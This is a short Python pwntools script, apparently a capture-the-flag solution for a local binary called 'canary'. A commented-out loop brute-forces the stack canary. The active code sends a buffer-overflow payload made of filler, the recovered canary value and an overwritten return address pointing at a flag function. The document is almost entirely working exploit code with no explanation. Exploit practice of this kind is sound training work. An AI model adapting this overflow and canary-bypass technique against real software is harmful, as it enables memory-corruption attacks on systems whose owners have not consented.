from pwn import *

flag_add = 0x565717ED
canary = 0x2921566c
# key = 0x0
# while(key <= 0xffffffff):
   # print '0x%x' %key
   # payload = 'a'*32 + '\x6c\x56\x21' + p32(key)
   # a = process('./canary')
   # # raw_input('debug')
    
   # a.recvuntil('Please enter the length of the entry:\n> ')
   # a.sendline('35')
   # a.recvuntil('Input> ')
   # a.sendline(payload)
   # if  a.recv(3)== ('Ok.'):
       # print '0x%x' %key
       # breakb*
   # key += 0x1
   # a.close()

payload = 'a'*32 + p32(canary) + 'a'*16 + p32(flag_add)
while 1:
   a = process('./canary')
   
   a.recvuntil('Please enter the length of the entry:\n> ')
   a.sendline('70')
   a.recvuntil('Input> ')
   a.sendline(payload)
   a.interactive()
   a.close()
